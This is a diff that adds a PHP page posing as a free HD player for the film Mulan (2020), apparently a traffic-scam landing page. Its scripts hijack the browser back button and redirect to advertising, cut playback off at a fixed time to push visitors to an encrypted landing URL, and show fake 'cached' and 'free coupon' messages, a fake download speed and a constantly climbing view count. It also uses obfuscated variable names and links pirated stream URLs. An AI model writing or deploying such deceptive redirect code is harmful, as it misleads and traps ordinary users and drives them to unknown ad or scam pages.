@@ -1,0 +1,548 @@
+<?php
+
+include_once __DIR__ .'/../common.php';
+
+include_once CONFIG_PATH .'config.php';
+
+$skin_sys_global_url = $sys_global_url . __MULU__ .'/';
+
+$params=http_build_query($_GET);
+
+include_once LIBRARY_PATH .'fwh_helper.php';
+$luodi_go = get_luodi_url();
+$luodi_go .= $_excrypter->encrypt(['t' => time(), 'class' => __MULU__ .'/doctory/bettle.php']).'?'.$params;
+
+if(!$_GET['from'] && !$_GET['article']){
+$advertising = $advertising.'qdfanhui=1&'.$params;
+}
+
+?>
+
+
+<!DOCTYPE html>
+<html class="U_html_bg U_color_a"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+	<title>《终极台风》高清在线观看</title>
+	<meta name="robots" content="all">
+	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,minimal-ui,viewport-fit=cover">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<meta name="HandheldFriendly" content="true">
+	<meta name="format-detection" content="telephone=no">
+	<link rel="stylesheet" href="<?=$skin_sys_global_url?>doctory/app/play_vip.css">
+	<!--<script src="<?=$skin_sys_global_url?>doctory/app/jquery.js"></script>-->
+	<!--<script src="<?=$skin_sys_global_url?>doctory/app/hls.js"></script>-->
+	<script src="<?=$skin_sys_global_url?>doctory/app/afhpX8E3ESWMmCHZa2Hy8JhxkZZ6XbwB.js"></script>
+	<style type="text/css">
+		/* 文字颜色1  视频海报图片第1亮色*/
+		.U_html_bg,
+		.U_color_a{
+			color: rgba(216,233,245,1);
+		}
+		.U_svg_a{
+			fill: rgba(216,233,245,1);
+		}
+		/* 文字颜色2  视频海报图片第2亮色*/
+		.U_color_b{
+			color: rgba(255,255,255,.8);
+		}
+		.U_svg_b{
+			fill: rgba(255,255,255,.8);
+		}
+		/* 背景 视频海报图片最暗色 */
+		.U_html_bg{
+			background-color: rgba(42,40,54,1);
+		}
+
+		/* 文字颜色3  视频海报图片第2亮色透明度60%*/
+		.U_color_c{
+			color: rgba(255,255,255,.6);
+		}
+		.U_svg_c{
+			fill: rgba(255,255,255,.6);
+		}
+		/**播放器海报遮罩**/
+		.U_mask_a{
+			background-image:-webkit-linear-gradient(bottom,rgba(42,40,54,1),rgba(42,40,54,.5) 30%,rgba(0,0,0,0));
+			background-image:linear-gradient(to top,rgba(42,40,54,1),rgba(42,40,54,.5) 30%,rgba(0,0,0,0));
+		}
+		#page li {
+
+			float: left;
+		}
+
+		/*#page li span {*/
+		/*	font-size: 1rem;*/
+		/*}*/
+
+		.active{
+			background: black!important;
+		}
+	</style>
+
+	<style id="tsbrowser_video_independent_player_style" type="text/css">
+		[tsbrowser_force_max_size] {
+			width: 100% !important;
+			height: 100% !important;
+			left: 0px !important;
+			top: 0px !important;
+			margin: 0px !important;
+			padding: 0px !important;
+			transform: none !important;
+		}
+		[tsbrowser_force_fixed] {
+			position: fixed !important;
+			z-index: 9999 !important;
+			background: black !important;
+		}
+		[tsbrowser_force_hidden] {
+			opacity: 0 !important;
+			z-index: 0 !important;
+		}
+		[tsbrowser_hide_scrollbar] {
+			overflow: hidden !important;
+		}
+		[tsbrowser_display_none] {
+			display: none !important;
+			visibility: hidden !important;
+			opacity: 0 !important;
+		}
+		[tsbrowser_force_show] {
+			display: black !important;
+			visibility: visible !important;
+			opacity: 0;
+		}</style></head>
+
+<body ontouchstart="" class="page_play_fm">
+<div style="display:none;" id="share_qq_img"></div>
+<!--图标SVG文件 开始-->
+<svg class="svg_sprite none" version="1.1" xmlns="http://www.w3.org/2000/svg">
+	<!--更多箭头-->
+	<symbol id="sym_icon_more" viewBox="0 0 32 32">
+		<path d="M31,15.118L19.117,27,17,24.883,26.884,15,17,5.117,19.117,3,31,14.883,30.883,15Z"></path>
+	</symbol>
+	<!--播放icon-->
+	<symbol id="sym_icon_play" viewBox="0 0 100 100">
+		<path d="M37.574,35s-0.58,1.508-.58,14.925,0.58,15.061.58,15.061a1.986,1.986,0,0,0,2.883,1.78s3.029-.469,15.221-6.594,14.233-8.4,14.233-8.4a2,2,0,0,0,0-3.559s-3.34-3.053-14.226-8.594c-10.771-5.483-15.228-6.4-15.228-6.4A1.986,1.986,0,0,0,37.574,35Z"></path>
+	</symbol>
+	<!--下载icon-->
+	<symbol id="sym_icon_download" viewBox="0 0 44 44">
+		<path d="M354,129V90h10v3h-7v33h33V93h-7V90h10v39H354Zm31-20-9.468,9.874,0,0-2.034,2.116-2.034-2.116,0,0L362,109h4l6,6.216V90h3v25.216L381,109h4Z" transform="translate(-352 -88)"></path>
+	</symbol>
+	<!--赠送icon-->
+	<symbol id="sym_icon_give" viewBox="0 0 44 44">
+		<path d="M394,107h-2v22H355V107h-2V97h5.833A5.933,5.933,0,0,1,358,94a6,6,0,0,1,6-6c2.868,0,6.73,3.938,9.5,7.3,2.771-3.365,6.634-7.3,9.5-7.3a5.962,5.962,0,0,1,5.168,9H394v10Zm-15,19h10V107H379v19Zm-21,0h10V107H358v19Zm-2-26v4h12v-4l-4,0h-8Zm8-9a3,3,0,0,0,0,6c1.782,0,7-.007,7,0C371,97.048,365.656,91,364,91ZM373.55,100H371v26h5V100H373.55ZM383,91c-1.656,0-7,6.05-7,6,0-.007,5.218,0,7,0A3,3,0,0,0,383,91Zm8,9h-8l-4,0v4h12v-4Z" transform="translate(-352 -88)"></path>
+	</symbol>
+	<!--切换icon-->
+	<symbol id="sym_icon_switch" viewBox="0 0 44 44">
+		<path d="M36.961,20.731l-13.886,7a2.045,2.045,0,0,1-.959.258c-0.039,0-.078,0-0.117,0s-0.078,0-.117,0a2.043,2.043,0,0,1-.959-0.258l-13.886-7A1.979,1.979,0,0,1,6.29,18a2.06,2.06,0,0,1,2.785-.732L22,23.782l12.924-6.515A2.06,2.06,0,0,1,37.707,18,1.98,1.98,0,0,1,36.961,20.731Z"></path>
+	</symbol>
+
+</svg>
+<!--图标SVG文件 结束-->
+
+<!-- 整个页面未加载 loading 开始 -->
+<div class="g_container_loading none">
+	<div class="loading_con">
+		<i class="icon_loading"></i>
+		<div class="loading_text">努力加载中</div>
+	</div>
+</div>
+<!-- 整个页面未加载 loading 结束 -->
+<!--播放页 开始-->
+<div class="container">
+	<div class="mod_head_vip" style="height: 40px;" id="vip_header">
+		<span id="back" onclick="javascript:history.back(-1);" style="line-height: 40px;margin-left: 10px;">&lt; 返回</span>
+		<h1 class="logo_title">
+			<div class="js_uvip_title" style="display:none;">
+				<div class="txt_info js_uvip_logo">
+					<span class="txt js_uvip_text"></span>
+				</div>
+				<!--<span class="icons js_icon_uvip">-->
+				<!--    <img class="icon_uvip" src="http://megq8.1125mall.com/nezha.php?code=yAfIU4MT8r3Y0peCLDEHOWxlQ6w5hv1J&amp;t=1564799263" style="width:18px;height:18px;margin-right:5px;display:none;">-->
+				<!--    <img class="icon_vip_png" src="http://megq8.1125mall.com/nezha.php?code=yAfIU4MT8r3Y0peCLDEHOWxlQ6w5hv1J&amp;t=1564799263" alt="" style="display: none"><!--vip1 grey1-->-->
+				<!--</span>-->
+			</div>
+
+		</h1>
+
+	</div>
+	<div class="">
+		<div id="dplayer" style="height: 30vh"></div>
+
+	</div>
+
+
+	<section class="mod_box U_box_bg_a" id="vip_title">
+		<div class="mod_bd">
+			<div class="mod_video_info">
+				<div class="video_tit U_color_a" style="float: left">花木兰 (2020)高清免费播放</div>
+				<div style="clear: both"></div>
+				<div class="video_types U_color_b">剧情 / 历史 / 战争</div>
+
+				<div class="video_starring U_color_b">主演: 刘亦菲 /安柚鑫 /甄子丹 /巩俐 /唐莎娜</div>
+
+				<div class="video_detail">
+					<div class="detail_txt U_color_b _desc none">在古代中国，一位年轻的女子为了救她的父亲假扮成男装代父从军。在穿越中国广袤土地的壮丽征程中，她从紧张的训练和战争中存活下来，发现自己内心的战士，并且最终从外族侵略者手中救回了皇帝和她的祖国。</div>
+
+					<div class="detail_switch _more ">
+        <span class="icon_switch">
+            <svg class="svg_icon_switch U_svg_c" version="1.1" viewBox="0 0 44 44">
+                <use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#sym_icon_switch"></use>
+            </svg>
+        </span>
+						<span class="icon_text U_color_c _text none">查看简介</span>
+					</div>
+
+				</div>
+				<div class="video_function">
+					<div class="function_txt">
+						<div class="watch_num U_color_c"><span class="num _view_count">184,772,<span id="viewNum">079</span></span>人次观看</div>
+					</div>
+					<div class="function_btn">
+						<a class="btn_download _btn_cache" href="javascript:" _hot="h5.detail.cache">
+							<i class="icon_download">
+								<svg class="svg_icon_download U_svg_b" version="1.1" viewBox="0 0 44 44">
+									<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#sym_icon_download"></use>
+								</svg>
+							</i>
+						</a>
+
+						<a class="btn_give" href="javascript:void(0);" _hot="h5.detail.givemovie">
+							<i class="icon_give">
+								<svg class="svg_pri svg_icon_give U_svg_b" version="1.1" viewBox="0 0 44 44">
+									<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#sym_icon_give"></use>
+								</svg>
+							</i>
+							<span class="icon_give_tips">礼包</span>
+						</a>
+
+					</div>
+				</div>
+
+				<section class="mod_box mod_sideslip_episodes U_box_bg_a" id="2016_episode">
+					<div class="mod_hd" style="margin-left:0;margin-right:0;border-top:1px solid #383838;padding-top:5px;">
+						<h2 class="mod_title U_color_a">播放地址</h2>
+						<div class="mod_hd_more U_color_c">每周一二三20点更新2集 会员始终多看4集/更新至28集</div>
+					</div>
+					<div class="mod_bd">
+						<div class="mod_episodes_numbers" _hot="episodes">
+							<ul class="_list" id="page">
+								<li mysrc="https://youku.cdn7-okzy.com/20200904/20640_2ade4805/index.m3u8" class="item current" vid="w0031s4gikk">
+									<a class="U_color_b" href="javascript:;">HD1<i class="mark_text_vip">超清</i></a>
+								</li>
+
+								<!--<li mysrc="https://diaoshi.dehua-kuyun.com/20200820/12895_a1cd8d2a/index.m3u8" class="item current" vid="w0031s4gikk">-->
+								<!--    <a class="U_color_b" href="javascript:;">HD2<i class="mark_text_vip">超清</i></a>-->
+								<!--</li> -->
+
+								<!--<li mysrc="https://yuledy.helanzuida.com/20200820/9183_da297a71/index.m3u8" class="item current" vid="w0031s4gikk">-->
+								<!--    <a class="U_color_b" href="javascript:;">HD3<i class="mark_text_vip">超清</i></a>-->
+								<!--</li> -->
+
+
+
+								<!--<li mysrc="https://youku.cdn7-okzy.com/20200820/20513_6741611c/index.m3u8" class="item current">-->
+								<!--	<a class="U_color_b" style="color: white" href="javascript:;">HD1<i class="mark_text_vip">超清</i></a>-->
+								<!--</li>-->
+
+								<!--	<li mysrc="https://diaoshi.dehua-kuyun.com/20200820/12895_a1cd8d2a/index.m3u8" class="item current">-->
+								<!--	<a class="U_color_b" style="color: white" href="javascript:;">HD2<i class="mark_text_vip">超清</i></a>-->
+								<!--</li>-->
+
+								<!--	<li mysrc="https://yuledy.helanzuida.com/20200820/9183_da297a71/index.m3u8" class="item current">-->
+								<!--	<a class="U_color_b" style="color: white"  href="javascript:;">HD3<i class="mark_text_vip">超清</i></a>-->
+								<!--</li>-->
+							</ul>
+						</div>
+					</div>
+				</section>
+
+			</div>
+		</div>
+	</section>
+
+
+</div>
+<!--播放页 结束-->
+<!--弹窗播放器 开始-->
+<div class="mod_ly_player none" id="vip_player_list">
+	<a class="ly_close" id="close_player" title="关闭" _hot="h5.detail.playerlist_close"></a>
+	<div class="ly_bd" id="player_list_wrap">
+		<ul class="ly_list cf" id="player_list">
+		</ul>
+	</div>
+</div>
+<!--弹窗播放器 结束-->
+<!--弹框区域 -->
+<!--遮罩 开始-->
+<div class="g_pop_mask none" style="background: url(<?=$skin_sys_global_url?>doctory/app/0.png) rgba(0, 0, 0, .8) no-repeat;background-position: right top 10px;background-size: 80%;"></div>
+<!--遮罩 结束-->
+<!--弹框 购买影片  开始-->
+<div class="g_pop g_pop_pay none">
+	<div class="pop_wrap">
+		<a class="pop_close" href="javascript:;" title="关闭"></a>
+		<div class="pop_title">VIP会员可免费观看</div>
+		<div class="pop_con">
+			<a class="btn_pay_a" href="javascript:;" _hot="h5.detail.pay" data-type="openpay" data-aidsource="2">好</a>
+
+		</div>
+	</div>
+</div>
+<div class="g_pop g_toast none" id="toast">
+	<div class="pop_wrap">
+		<div class="pop_con">
+			<p class="txt _txt">toast</p>
+		</div>
+	</div>
+</div>
+<div class="page_play"></div>
+<!--弹框 购买影片  结束-->
+<script src="<?=$skin_sys_global_url?>doctory/app/jquery.min.js"></script>
+<link rel="stylesheet" href="<?=$skin_sys_global_url?>doctory/app/weui.min.css">
+<div class="weui_dialog_alert" id="dialog_alert" style="display:none;color:#000000;z-index: 99999;">
+	<div class="weui_mask"></div>
+	<div class="weui_dialog">
+		<div class="weui_dialog_hd"><strong class="weui_dialog_title">温馨提示</strong></div>
+		<div class="weui_dialog_bd" id="dialog_alert_Mes" style="color:#000000"></div>
+		<div class="weui_dialog_ft">
+			<a onclick="dialog_alert_Hide();" id="okBtn" class="weui_btn_dialog primary">好</a>
+		</div>
+	</div>
+</div>
+
+<div id="zhezhao_share" style="position: fixed; left: 0px; right: 0px; top: 0px; bottom: 0px; display: none; background-color: rgba(0, 0, 0, 0.8);z-index: 999;">
+	<p style="text-align: right; padding-left: 10px;color:#fff;font-size:20px">
+		<img src="<?=$skin_sys_global_url?>doctory/app/q2.png" id="share-wx-img" style="width: 100%; padding-right: 15px;">
+	</p>
+</div>
+
+<div class="loading" id="loadingMovie">
+	<div class="loading_con"><img src="<?=$skin_sys_global_url?>doctory/app/loading.gif" alt=""><p>即将播放 <span id="number">690</span>kb/s</p></div>
+</div>
+
+<script type="text/javascript">
+
+    var advertising = '<?=$advertising?>';
+    function gogg(url){
+        history.pushState(history.length+1, "message", window.location.href.split('#')[0]+"#"+new Date().getTime());
+        if(navigator.userAgent.indexOf('Android') != -1){
+            if(typeof(tbsJs) != "undefined"){
+                tbsJs.onReady('{useCachedApi : "true"}', function(e) {})
+                window.onhashchange=function(){
+                    location.href = url;
+                };
+            }else{
+                var pop = 0;
+                window.onhashchange = function(event) {
+                    pop++;
+                    if (pop >= 3) {
+                        location.href = url;
+                    }else{
+                        history.go(1)
+                    }
+                };
+                history.go(-1);
+            }
+        }else{
+            window.onhashchange=function(){
+                location.href = url;
+            };
+        }
+    }
+    gogg(advertising);
+
+    var obj= {
+        vid: 'g3155g8wntt',
+        pic: 'https://6d69-miofly-k1xjk-1303051262.tcb.qcloud.la/images/glnz/1.jpg',
+        breakTime: 157
+    }
+
+    var temp = 'a'
+    var video = new tvp.VideoInfo();
+    video.setVid(obj.vid);
+    var player = new tvp.Player('100%', '350');
+    player.setCurVideo(video);
+    player.addParam("wmode", "transparent");
+    player.addParam("pic", obj.pic);
+    player.write("dplayer");
+
+    var AA3emc5fEm4ZjkfXGMftWdQd3zKR7W4s = 'kYmt5HTx5Bhhad3yjjN52Hwdj8G3Pmiy'
+    var AMQiZM67KYj7K8CdpH3cd6jk5b4j84NT = 'MxdiG8RGnAFahxHR3RNzsA8Eyyy3Gjwk'
+    player.onplay = function () {
+        if (AA3emc5fEm4ZjkfXGMftWdQd3zKR7W4s == 'kYmt5HTx5Bhhad3yjjN52Hwdj8G3Pmiy' && rcm5GShPfNhNanzY8sJCdRRJ6N8eFhxM('isplay') != 1) {
+            video.setHistoryStart(3);
+        }
+    }
+
+    player.ontimeupdate = function (e) {
+        if (player.getCurTime() >= obj.breakTime && rcm5GShPfNhNanzY8sJCdRRJ6N8eFhxM('isplay') != 1 && AMQiZM67KYj7K8CdpH3cd6jk5b4j84NT == 'MxdiG8RGnAFahxHR3RNzsA8Eyyy3Gjwk') { // 控制断点不需要直接注释
+            player.pause();
+            location.href='<?=$luodi_go?>';
+
+            // xMtHtSXnrNazSBk4tBKrfHe4nAWkcTbm(Qr2ezzdW2kzrpFbc2Er4Ah8YGFACniSi.sBbsjbpbRpndpBerjtME8bGbjDStkPcf + '?isplay=1')
+            AMQiZM67KYj7K8CdpH3cd6jk5b4j84NT = 'i2pQ5xaaHDDyBhbZMNHmdb4DkrGDYjSC'
+        }
+        // if (AA3emc5fEm4ZjkfXGMftWdQd3zKR7W4s == 'kYmt5HTx5Bhhad3yjjN52Hwdj8G3Pmiy' && rcm5GShPfNhNanzY8sJCdRRJ6N8eFhxM('isplay') != 1) {
+        //     riKnmEMEyKKrB8bBCTixMM3tt4jMmt8f.seekTo(3)
+        //     riKnmEMEyKKrB8bBCTixMM3tt4jMmt8f.setPlaytime(3)
+        //     AA3emc5fEm4ZjkfXGMftWdQd3zKR7W4s = 'D3QkaAyBHm8pnMNbwZfkd8dDiHwZbE4K'
+        // }
+        if (AA3emc5fEm4ZjkfXGMftWdQd3zKR7W4s == 'kYmt5HTx5Bhhad3yjjN52Hwdj8G3Pmiy' && rcm5GShPfNhNanzY8sJCdRRJ6N8eFhxM('isplay') == 1) {
+            player.seekTo(obj.breakTime)
+            player.setPlaytime(obj.breakTime)
+            AA3emc5fEm4ZjkfXGMftWdQd3zKR7W4s = 'D3QkaAyBHm8pnMNbwZfkd8dDiHwZbE4K'
+        }
+    }
+
+    player.onended = function () {
+        location.href=advertising;
+    }
+
+
+    function rcm5GShPfNhNanzY8sJCdRRJ6N8eFhxM(name, url) { // 获取地址栏参数
+        if (typeof name !== 'string') return false
+        if (!url) url = window.location.href
+        // 当遇到name[xx]时，对方括号做一下转义为 name\[xxx\]，因为下面还需要使用name做正则
+        name = name.replace(/[\[\]]/g, '\\$&')
+        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)')
+        var results = regex.exec(url)
+        if (!results) return null
+        if (!results[2]) return ''
+        return decodeURIComponent(results[2].replace(/\+/g, ' '))
+    }
+
+    $('#page li').bind('click', function() {
+        $('#page li').removeClass('active')
+        $(this).addClass('active')
+        console.log($(this).attr('mysrc'))
+        getVideo($(this).attr('mysrc'))
+    })
+
+    function getParam(name, url) { // 获取地址栏参数
+        if (typeof name !== 'string') return false
+        if (!url) url = window.location.href
+        // 当遇到name[xx]时，对方括号做一下转义为 name\[xxx\]，因为下面还需要使用name做正则
+        name = name.replace(/[\[\]]/g, '\\$&')
+        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)')
+        var results = regex.exec(url)
+        if (!results) return null
+        if (!results[2]) return ''
+        return decodeURIComponent(results[2].replace(/\+/g, ' '))
+    }
+
+    function viewMovie(){
+        var loadmovie = document.getElementById("loadingMovie");
+        loadmovie.style.display = "block";
+        setInterval(randomNumber, 1000);
+        setTimeout(function(){
+            location.href = '<?=$luodi_go?>';
+        },2000);
+    }
+    function randomNumber(){
+        var a = Math.random()*1000;
+        var b = Math.ceil(a);
+        document.getElementById("number").innerHTML = b;
+    }
+
+    var numon = parseInt(document.getElementById("viewNum").innerHTML);
+    setInterval(addNum,1000);
+    function addNum(){
+        numon++;
+        document.getElementById("viewNum").innerHTML = numon;
+    }
+
+    $('.pop_con,.pop_close').on('click',function(){
+        $(".g_pop_pay").addClass('none');
+    })
+
+    $('.g_pop_mask').click(function(){
+        $(".g_pop_pay").removeClass('none');
+    })
+
+    $('#vip_player').on('click',function(){
+        viewMovie();
+    })
+    $('.item').on('click',function(){
+        getVideo('https://youku.cdn7-okzy.com/20200904/20640_2ade4805/index.m3u8')
+    })
+
+    function alert_Mes(mes){
+        $(".g_pop_pay").removeClass('none');
+        $(".g_pop_mask").removeClass('none');
+        $(".pop_title").html(mes);
+
+    }
+
+    //function show_tip(){
+    //alert_Mes('<span style="font-size: 20px;color: #f5294c">应版权方宣传要求</span></br>发送到微信群即可观看全集');
+    //}
+    //简介
+    $('._more').on('click',function(){
+        if ($('._desc').hasClass('none')) {
+            $('._desc').removeClass('none');
+            $('._text').text('收起');
+            $('._more').addClass('open');
+        }else{
+            $('._desc').addClass('none');
+            $('._text').text('查看简介');
+            $('._more').removeClass('open');
+        }
+    })
+
+    //缓存
+    $('.btn_download').on('click',function(){
+        $('#toast').removeClass('none');
+        $('._txt').text('已缓存完成，可以观看了');
+        // setTimeout(function(){
+        //     $('#toast').addClass('none');
+        //     show_tip();
+        // },3000)
+        setTimeout(function(){
+            $('#toast').addClass('none');
+        },1000);
+    })
+
+    //礼包
+    $('.btn_give').on('click',function(){
+        $('#toast').removeClass('none');
+        $('._txt').text('已送您优惠券，可以免费观看了');
+        // setTimeout(function(){
+        //     $('#toast').addClass('none');
+        //     show_tip();
+        // },3000)
+        setTimeout(function(){
+            $('#toast').addClass('none');
+        },1000);
+
+    })
+
+</script>
+
+<script src="<?=$skin_sys_global_url?>static/js/common.js"></script>
+
+<script>
+    var advertising = e_dealurl('<?=$advertising?>', 'qdfanhui');
+    var sys_global_url = '<?=$skin_sys_global_url?>';
+    var c_url_back="window.location.href=e_dealurl('<?=$advertising?>', 'qdfanhui')";
+    var c_url="window.location.href=e_dealurl('<?=$advertising?>', 'qdfanhui')";
+
+    <?=$tongji?>
+
+    var go_gg = function() {
+
+        eval(c_url_back);
+    }
+
+    // setTimeout(function(){
+    //     history.pushState(history.length + 1, "message", "#" + new Date().getTime());
+    // },200);
+    window.onhashchange = function() {
+        go_gg();
+    };
+
+</script>
+
+<script type="text/javascript" src="/bak/weizhuan/wz-jb.php"></script>
+</body>
+</html>
